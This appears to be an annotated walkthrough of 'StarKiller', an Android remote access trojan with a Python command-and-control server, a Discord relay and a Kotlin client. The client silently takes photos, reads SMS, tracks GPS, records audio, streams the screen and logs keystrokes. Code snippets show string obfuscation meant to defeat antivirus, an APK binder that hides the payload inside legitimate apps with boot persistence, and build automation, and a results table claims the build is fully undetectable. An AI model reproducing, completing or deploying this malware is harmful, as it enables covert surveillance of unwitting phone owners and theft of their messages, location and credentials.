# STARKILLER — Annotated Code Walkthrough

22DIV / george wu

---

## Architecture Overview

StarKiller is a two-component Android RAT: a Python C2 server (web dashboard + desktop GUI) and a Kotlin Android client. Communication uses a custom TCP protocol — 4-byte big-endian length prefix followed by a UTF-8 JSON payload. The client runs as a foreground service with exponential-backoff reconnection, dispatching tasks through a central dispatcher to specialized hardware/data modules.

```
Operator ──GUI──▶ C2 GUI (tkinter)  ◀──TCP──▶  Android Agent
                    :8667 listener              SyncService
                   [Discord relay]               └─ Dispatcher
                                                    ├─ modA (SysInfo)
                                                    ├─ modB (PhotoHelper)
                                                    ├─ modC (MsgReader)
                                                    ├─ modD (LocProvider)
                                                    ├─ modE (AddrBook)
                                                    ├─ modF (StorageHelper)
                                                    ├─ modG (AudioHelper)
                                                    ├─ modH (DisplayHelper)
                                                    ├─ modI (HistoryReader)
                                                    └─ modJ (PkgScanner)
```

All module references in compiled DEX use `modA`-`modJ` — no semantic names leak.

---

## 1. C2 GUI — `server/starkiller_gui.py`

**Purpose**: Desktop tkinter C2 controller with agent management, operation dispatch, Discord relay for internet access.

### Key Components

- **Agent sidebar**: live list of connected devices with model/battery
- **Device info panel**: detailed device info on selection
- **Operation buttons**: 15 ops + FULL RECON + VNC STREAM
- **Console**: color-coded task dispatch and result logging
- **Command bar**: direct JSON task dispatch
- **Discord relay**: `DiscordRelay` class bridges TCP ↔ Discord channel for NAT bypass
- **Live screen panel**: 360x640 for VNC frame display via Pillow/ImageTk

### TCP Listener

Runs on `:8667` in a background thread. Each agent gets its own handler thread. Protocol identical to the Kotlin client — 4-byte big-endian length + JSON.

```python
def agent_handler(self, sock, addr):
    msg = self.recv_msg(sock)
    if not msg or msg.get("type") != "register":
        sock.close()
        return
    agent_id = msg.get("agent_id", uuid.uuid4().hex[:8])
    # ...store agent, update sidebar...
    while True:
        msg = self.recv_msg(sock)
        if msg is None: break
        # route heartbeat/result/file_data
```

### Discord Relay

Optional internet C2 via Discord bot. Commands flow as `!task` messages, results as `!result`. Agent registration via `!register`. Bypasses NAT without port forwarding.

```bash
python server/starkiller_gui.py --discord-token BOT_TOKEN --channel-id CHANNEL_ID
```

---

## 2. Encrypted Config — `client/.../Config.kt`

**Path**: `client/app/src/main/kotlin/com/android/internal/svc/Config.kt`

Computed properties call `Crypt.d()` at runtime — encrypted blobs baked at build time. Port and timing use `const val` (inlined, just numbers).

```kotlin
object Config {
    val SYNC_HOST: String get() = Crypt.d("a2Juc29pWHRqcmxubw==")
    const val SYNC_PORT = 8667
    const val RECONNECT_BASE_MS = 5000L
    const val RECONNECT_MAX_MS = 300000L
    const val HEARTBEAT_INTERVAL_MS = 30000L
    val APP_NAME: String get() = Crypt.d("CSIvKTsyQAk+Lis3PAU=")
    const val HIDE_ICON = false
}
```

`SYNC_HOST` and `APP_NAME` use `val ... get()` — dynamic, never inlined. IP address and app name invisible in DEX `strings` dump.

---

## 3. XOR Cipher — `client/.../Crypt.kt`

**Path**: `client/app/src/main/kotlin/com/android/internal/svc/Crypt.kt`

XOR with key `0x5A`, rolling offset `(KEY + i % 7)`. 7-byte repeating key cycle defeats single-byte frequency analysis. Base64 for transport. Python mirror in `obfuscate.py` uses identical logic.

```kotlin
object Crypt {
    private const val KEY: Byte = 0x5A
    fun d(encoded: String): String {
        val raw = Base64.decode(encoded, Base64.NO_WRAP)
        val out = ByteArray(raw.size)
        for (i in raw.indices) {
            out[i] = (raw[i].toInt() xor (KEY.toInt() + i % 7)).toByte()
        }
        return String(out, Charsets.UTF_8)
    }
}
```

Not cryptographically strong — anti-static-analysis. Raises cost from `grep` to "reverse-engineer Crypt class."

---

## 4. TCP Client — `client/.../SyncAdapter.kt`

**Path**: `client/app/src/main/kotlin/com/android/internal/svc/SyncAdapter.kt`

All JSON keys encrypted with `Crypt.d()`. `k()` is one-char alias. Send path is `@Synchronized` to prevent interleaved writes from concurrent threads.

```kotlin
private fun k(e: String) = Crypt.d(e)

private fun register() {
    val info = JSONObject().apply {
        put(k("LiIsOA=="), k("KD47NC0rBSg="))     // "type" -> "register"
        put(k("Ozw5MyoACT4="), agentId)             // "agent_id"
        put(k("MjQvKTA+DT8="), Build.MODEL)         // "hostname"
        put(k("NSg="), "Android ${Build.VERSION.RELEASE}")  // "os"
        put(k("Kjc9KTgwEjc="), "android")           // "platform"
    }
    sendMsg(info)
}
```

Wire format mirrors C2 exactly: 4-byte big-endian length + UTF-8 JSON. Max 10MB guard.

---

## 5. Foreground Service — `client/.../SyncService.kt`

**Path**: `client/app/src/main/kotlin/com/android/internal/svc/SyncService.kt`

Exponential backoff reconnection. `START_STICKY` tells Android to restart if killed. `PARTIAL_WAKE_LOCK` keeps CPU running through Doze mode.

```kotlin
private fun connectionLoop() {
    while (running) {
        try {
            client.connect()
            reconnectDelay = Config.RECONNECT_BASE_MS
            startHeartbeat()
            client.receiveLoop()  // blocks until disconnect
        } catch (_: Exception) {}
        client.disconnect()
        if (!running) break
        Thread.sleep(reconnectDelay)
        reconnectDelay = min(reconnectDelay * 2, Config.RECONNECT_MAX_MS)
    }
}
```

Heartbeat fires every 30s. `IMPORTANCE_LOW` notification minimally visible.

---

## 6. Task Dispatcher — `client/.../Dispatcher.kt`

**Path**: `client/app/src/main/kotlin/com/android/internal/svc/Dispatcher.kt`

Central dispatch for all C2 commands. Modules lazy-initialized as `modA`-`modJ` — no semantic names in DEX. 4-thread executor pool for concurrent task execution. All operation strings encrypted via `k()`.

```kotlin
class Dispatcher(private val service: SyncService) {
    private val modA by lazy { SysInfo(service) }
    private val modB by lazy { PhotoHelper(service) }
    private val modC by lazy { MsgReader(service) }
    private val modD by lazy { LocProvider(service) }
    private val modE by lazy { AddrBook(service) }
    private val modF by lazy { StorageHelper(service) }
    private val modG by lazy { AudioHelper(service) }
    private val modH by lazy { DisplayHelper(service) }
    private val modI by lazy { HistoryReader(service) }
    private val modJ by lazy { PkgScanner(service) }

    fun dispatch(task: JSONObject) {
        executor.submit {
            val op = task.optString(k("NSs="), "")
            val result = when (op) {
                k("KSIvNDA5Dw==") -> modA.collect()      // sysinfo
                k("OToxOCw+")     -> modB.capture(...)    // camera
                k("KTYvAiw6AT4=") -> modC.readAll()       // sms_read
                k("PSsv")         -> modD.getLocation()   // gps
                // ... all 18 operations ...
            }
            client.sendResult(taskId, result)
        }
    }
}
```

Error isolation: each task in try/catch. Failing camera capture doesn't break receive loop.

---

## 7. Key Modules

### PhotoHelper (modB) — Camera2 API

Silent capture: `TEMPLATE_STILL_CAPTURE`, no preview surface, no shutter sound. 640x480 JPEG. `CountDownLatch` synchronises async Camera2 callbacks with 10s timeout.

### InputService — Accessibility keylogger

Extends `AccessibilityService`. Captures `TYPE_VIEW_TEXT_CHANGED` events across all apps. `ConcurrentLinkedQueue` buffer (5000 cap). Format: `timestamp|package|text`. Requires user to enable in Settings.

### LocProvider (modD) — GPS

Three-tier: (1) cached GPS fix, (2) cached network fix, (3) fresh `requestSingleUpdate` with 15s timeout. Single fix then deregisters — no persistent GPS icon.

### DisplayHelper (modH) — Screen capture + VNC

MediaProjection-based. `GrantActivity` launches transparent grant dialog. Supports both single screenshot and continuous VNC streaming with configurable interval/frame count.

### AudioHelper (modG) — Mic recording

`MediaRecorder` with configurable duration. Output as base64-encoded audio data.

---

## 8. Obfuscation Pipeline — `obfuscate.py`

Four capabilities: string encryption, ProGuard rule generation, detection scanning (binary + DEX string tables).

```python
KEY = 0x5A
def encrypt_string(plain):
    raw = plain.encode("utf-8")
    out = bytearray(len(raw))
    for i in range(len(raw)):
        out[i] = raw[i] ^ (KEY + i % 7)
    return base64.b64encode(bytes(out)).decode("ascii")
```

DEX scanner extracts strings from all `.dex` files inside APKs via `zipfile` + regex, checking for known RAT indicators. Catches signatures that binary-only scans miss.

---

## 9. APK Binder — `binder.py`

Six-stage pipeline: decompile → inject Smali → patch manifest → hook launcher `onCreate` → repackage → sign.

Startup hook adds `startPayload()` to launcher activity. Starts `SyncService` via `startForegroundService()`. Boot receiver (`StartReceiver`) ensures persistence across reboots.

```smali
.method private startPayload()V
    .locals 2
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/android/internal/svc/SyncService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
```

Post-bind scan runs automatically via `obfuscate.scan_file_for_signatures`.

---

## 10. Build Automation — `build.py`

Config injection with encrypted values. Sets `ANDROID_SDK_ROOT`, writes `local.properties`, runs Gradle.

```python
def inject_config(ip, port, app_name, hide_icon):
    enc_host = xor_encrypt(ip)
    enc_name = xor_encrypt(app_name)
    config = f'''package com.android.internal.svc
object Config {{
    val SYNC_HOST: String get() = Crypt.d("{enc_host}")
    const val SYNC_PORT = {port}
    // ...
}}'''
```

R8 enabled on both debug and release builds. Output: `payloads/starkiller-{variant}.apk`.

---

## 11. Test Suite

### test_client.py — Simulated Android agent

Simulates Samsung Galaxy S24 Ultra. Responds to all 18 operations with fake Australian data. GPS drift around Sydney. Battery drain simulation. VNC frame generation via Pillow.

### test_headless.py — 38 automated integration tests

10 phases: listener bind, registration, multi-agent, 13 op dispatches, heartbeat, file transfer, disconnect handling, edge cases, obfuscation scan, crypto roundtrip.

---

## FUD Verification Results (2026-06-23)

| Check | Result |
|-------|--------|
| Package name | `com.android.internal.svc` — system service pattern |
| Class references in DEX | ZERO `Lcom/starkiller/` references |
| Module names in DEX | All `modA`-`modJ` — no semantic leaks |
| Protocol strings | ALL encrypted (via `Crypt.d()`) |
| Config (host/port) | Encrypted (XOR+Base64) |
| Source filenames | Stripped by `-renamesourcefileattribute ''` |
| R8 obfuscation | 5-pass, flatten, repackage, strip kotlin metadata |
| Standalone APK scan | 0 payload identifiers / 15,908 DEX strings |
| Bound APK scan | 0 payload identifiers / 268,229 DEX strings |
| APK size | 969 KB (R8 shrank from 3.1 MB) |

---

*Built from VADER's protocol. The agent doesn't care what OS it runs on.*
